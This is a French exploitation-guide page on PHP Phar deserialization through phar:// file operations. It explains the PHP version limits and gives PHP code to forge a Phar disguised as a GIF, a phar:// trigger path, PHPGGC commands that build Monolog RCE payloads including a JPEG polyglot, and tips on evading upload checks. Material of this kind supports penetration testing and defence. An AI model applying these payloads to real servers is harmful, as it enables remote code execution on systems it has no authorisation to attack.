---
order: 3
title: "Désérialisation phar : injection d'objet via phar:// lors des opérations de fichier"
description: "Atteindre l'injection d'objet PHP sans appel à unserialize() en déclenchant la désérialisation des métadonnées d'une archive Phar lorsqu'une fonction de fichier touche un chemin phar://."
keywords:
  - désérialisation phar
  - phar://
  - injection d'objet
  - unserialize de métadonnées
  - PHPGGC
---

# Désérialisation phar

PHP stocke les métadonnées d'une archive Phar sous forme d'objet PHP sérialisé. **Sur PHP 7.4 et antérieur**, le moteur désérialise automatiquement ces métadonnées dès qu'une opération de fichier accède à l'archive via le wrapper `phar://`, avant toute extraction. Sur ces versions, un attaquant qui peut (a) déposer un Phar forgé sur le serveur et (b) faire agir presque n'importe quelle fonction de fichier sur un chemin `phar://` atteint l'[injection d'objet PHP](../insecure-deserialization/php-object-injection.md) **sans `unserialize()` explicite dans le code**.

**Cela a changé en PHP 8.0.** Toucher un chemin `phar://` (par exemple avec `file_exists()`) ne désérialise plus les métadonnées de lui-même ; les métadonnées ne sont désérialisées que par un appel explicite à `Phar::getMetadata()`. Donc sur PHP 8.x la technique de déclenchement automatique ci-dessous ne se déclenche pas, et ce vecteur se limite aux chemins de code qui lisent explicitement les métadonnées Phar. Confirmez que la cible exécute PHP 7.4 ou antérieur avant de vous y fier.

## Pourquoi ça fonctionne (PHP <= 7.4)

Sur les versions vulnérables, de nombreuses fonctions déclenchent la désérialisation des métadonnées : `file_exists`, `is_file`, `file_get_contents`, `fopen`, `getimagesize`, `stat`, `unlink`, `copy`, et d'autres, du moment que le chemin commence par `phar://`. La chaîne de gadgets est identique à celle de l'injection d'objet ordinaire ; `phar://` n'est purement que le vecteur de livraison qui amène l'objet sérialisé jusqu'à `unserialize` sans que l'application l'appelle.

## Construire et déclencher

Forger un Phar dont les métadonnées sont un objet gadget, puis le déguiser pour passer les filtres de téléversement (un Phar peut porter un en-tête d'image valide, il peut donc servir aussi de « GIF » ou « JPEG »). Notez qu'écrire un Phar nécessite `phar.readonly=0`, qui est désactivé par défaut, donc construisez l'archive avec ce réglage désactivé (`php -d phar.readonly=0 build.php`) ; cela n'affecte que *votre* machine de build, pas la cible :

```php
<?php
class Gadget {}                      // a class whose magic method starts your chain
$p = new Phar('exploit.phar');
$p->startBuffering();
$p->addFromString('x.txt', 'x');
$p->setStub('GIF89a<?php __HALT_COMPILER(); ?>');   // image-looking stub
$g = new Gadget();
$g->data = '...';                    // gadget properties
$p->setMetadata($g);                 // serialized into the archive
$p->stopBuffering();
?>
```

Construisez-le, renommez-le en `exploit.gif`, téléversez-le, puis pointez un sink d'opération de fichier dessus :

```
phar:///var/www/uploads/exploit.gif/x.txt
```

Toucher ce chemin désérialise les métadonnées et exécute la chaîne. En pratique, **PHPGGC** construit toute l'archive pour un gadget de framework connu :

```bash
phpggc -p phar -o exploit.phar Monolog/RCE1 system 'id'
# polyglot: -pj/--phar-jpeg takes an EXISTING valid JPEG to embed into, and -o names the output
phpggc -pj base.jpg -o exploit.jpg Monolog/RCE1 system 'id'
```

## Notes d'exploitation

- Vous avez besoin d'un emplacement inscriptible que vous pouvez référencer (téléversements, temp, fichiers de session) et d'un sink qui prend un chemin `phar://` (souvent une fonctionnalité d'avatar/d'aperçu/de « vérifier si le fichier existe »).
- Le stub n'a besoin que de `__HALT_COMPILER();` ; préfixer des octets magiques d'image déjoue les contrôles de téléversement basés sur le content-type et sur `getimagesize`.
- Le déclenchement automatique est propre à PHP 7.4 et antérieur (voir ci-dessus) ; sur PHP 8.x, repliez-vous sur les [chaînes de filtres vers RCE](filter-chains-to-rce.md) ou les [wrappers data et input](data-and-input-wrappers.md), ou trouvez un chemin de code qui appelle explicitement `Phar::getMetadata()`.

## Outils

- **PHPGGC** avec `-p phar` (et `-pj` pour les polyglots).

## Références

- PHP manual: Phar, phar:// wrapper
- PHPGGC project
